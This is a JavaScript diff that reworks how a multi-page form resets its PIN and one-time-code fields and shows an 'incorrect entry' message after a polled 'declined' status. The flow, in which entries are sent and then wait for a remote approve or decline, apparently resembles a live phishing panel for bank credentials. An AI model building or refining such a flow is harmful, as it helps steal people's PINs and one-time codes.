@@ -556,39 +556,31 @@ async function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, 
       } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
-        // 1. Unveil the form viewport by hiding the loading screen overlay panel
+        // 1. Hide the waiting spinner overlay panel cleanly
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear input arrays safely within the specific container boundary view
+        // 2. Clear out the fields on the current page to allow fresh typing
         const currentContainer = document.getElementById(currentPageId);
         if (currentContainer) {
           const inputs = currentContainer.querySelectorAll('input');
           inputs.forEach(input => {
             input.value = '';
           });
+
+          // 3. Lock the button back down until they re-enter text
+          const pageButton = currentContainer.querySelector('button:not([id*="decline"])');
+          if (pageButton) {
+            pageButton.disabled = true;
+          }
+        }
+        
+        // 4. Force a native input event so your existing event validation code refreshes automatically
+        if (currentContainer) {
+          const nativeEvent = new Event('input', { bubbles: true });
+          currentContainer.dispatchEvent(nativeEvent);
         }
 
-        // 3. Reset the standard global pin grid input fields safely
-        const globalPinBoxes = document.querySelectorAll('.boxes input');
-        globalPinBoxes.forEach(box => {
-          box.value = '';
-        });
-
-        // 4. Clean fixed target fields directly by structural ID attribute
-        const explicitOtp = document.getElementById('code1');
-        if (explicitOtp) explicitOtp.value = '';
-
-        // 5. Explicitly reset the targeted confirmation controls to locked state
-        const explicitBtn = document.getElementById('submitCode1');
-        if (explicitBtn) {
-          explicitBtn.disabled = true;
-        } else if (currentContainer) {
-          // Fallback mechanism to look up target click controls safely if the ID is missing
-          const primaryBtn = currentContainer.querySelector('#submitCode1, button[id*="submit"], button:not([id*="decline"])');
-          if (primaryBtn) primaryBtn.disabled = true;
-        }
-
-        // 6. Present the rejection message directly onto the target element
+        // 5. Update the alert text safely
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
